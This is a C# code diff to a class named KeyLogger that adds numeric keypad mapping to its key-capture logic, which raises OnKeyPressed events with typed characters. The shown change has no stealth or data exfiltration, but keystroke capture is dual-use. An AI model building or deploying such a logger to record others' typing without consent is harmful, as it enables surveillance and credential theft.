@@ -76,6 +76,11 @@ public class KeyLogger
                 char keyChar = IsShiftPressed() ? GetShiftedNumber(key) : (char)key;
                 OnKeyPressed?.Invoke(keyChar);
             }
+            else if (key >= Keys.NumPad0 && key <= Keys.NumPad9)
+            {
+                char keyChar = GetNumpad(key);
+                OnKeyPressed?.Invoke(keyChar);
+            }
             else if (key == Keys.Oem1 || key == Keys.Oem3 || key == Keys.Oem7)
             {
                 char keyChar = key == Keys.Oem1 ? 'ü' : key == Keys.Oem3 ? 'ö' : key == Keys.Oem7 ? 'ä' : ' ';
@@ -96,6 +101,24 @@ public class KeyLogger
     private bool IsShiftPressed()
     {
         return (Control.ModifierKeys & Keys.Shift) == Keys.Shift;
+    }
+
+    private char GetNumpad(Keys key)
+    {
+        return key switch
+        {
+            Keys.NumPad0 => '0',
+            Keys.NumPad1 => '1',
+            Keys.NumPad2 => '2',
+            Keys.NumPad3 => '3',
+            Keys.NumPad4 => '4',
+            Keys.NumPad5 => '5',
+            Keys.NumPad6 => '6',
+            Keys.NumPad7 => '7',
+            Keys.NumPad8 => '8',
+            Keys.NumPad9 => '9',
+            _ => ' '
+        };
     }
 
     private char GetShiftedNumber(Keys key)
